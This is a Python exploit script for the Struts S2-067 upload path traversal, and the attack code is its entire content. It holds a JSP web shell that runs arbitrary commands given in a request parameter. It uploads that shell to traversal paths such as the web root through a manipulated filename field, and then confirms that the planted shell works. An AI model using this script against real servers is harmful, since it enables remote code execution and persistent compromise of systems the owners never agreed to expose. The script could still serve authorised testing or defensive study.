import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string


def generate_random_filename(extension=".jsp"):
    """Generate a random filename with a given extension."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension


def create_payload():
    """Create a simple JSP payload for RCE testing."""
    return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    }
%>"""


def upload_payload(target_url, upload_endpoint, payload, paths, filenames):
    """
    Upload payload using Ognl parameter manipulation to trigger path traversal bypass.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Target upload endpoint: {upload_url}")

    headers = {"User-Agent": "Mozilla/5.0"}
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    for path in paths:
        for filename in filenames:
            print(f"[INFO] Testing path traversal with: {path}/{filename}")
            modified_filename = f"{path}/{filename}"
            files = {
                "upload": (filename, payload, "application/octet-stream"),
                "uploadFileName[0]": modified_filename,  # Ognl manipulation for multi-file upload
            }

            m = MultipartEncoder(fields=files, boundary=boundary)
            headers["Content-Type"] = m.content_type

            try:
                response = requests.post(upload_url, headers=headers, data=m, timeout=10)
                if response.status_code == 200:
                    print(f"[SUCCESS] File uploaded to {modified_filename}")
                    verify_uploaded_file(target_url, path, filename)
                else:
                    print(f"[ERROR] Upload failed. HTTP {response.status_code}")
            except requests.RequestException as e:
                print(f"[ERROR] Request failed: {e}")


def verify_uploaded_file(target_url, path, filename):
    """Verify if the uploaded payload can be accessed and executed."""
    file_url = urljoin(target_url, f"{path}/{filename}")
    print(f"[INFO] Verifying file: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200 and "cmd" in response.text:
            print(f"[ALERT] Exploit successful! Webshell: {file_url}?cmd=whoami")
        else:
            print(f"[INFO] File verification failed. HTTP {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")


def main():
    parser = argparse.ArgumentParser(description="Advanced S2-067 Exploit for Path Traversal")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Upload endpoint path (e.g., /uploads.action)")
    parser.add_argument("--paths", nargs="+", help="Path traversal vectors", default=[
        "../../../../../webapps/ROOT", "../../../../../../tmp"
    ])
    parser.add_argument("--filenames", nargs="+", help="Custom filenames to test",
                        default=[generate_random_filename() for _ in range(3)])
    parser.add_argument("--payload", help="Custom payload", default=create_payload())
    args = parser.parse_args()

    print("[INFO] Starting S2-067 Exploit...")
    print(f"[INFO] Testing with filenames: {args.filenames}")
    upload_payload(args.url.rstrip("/"), args.upload_endpoint, args.payload, args.paths, args.filenames)
    print("[INFO] Exploit process completed.")


if __name__ == "__main__":
    main()
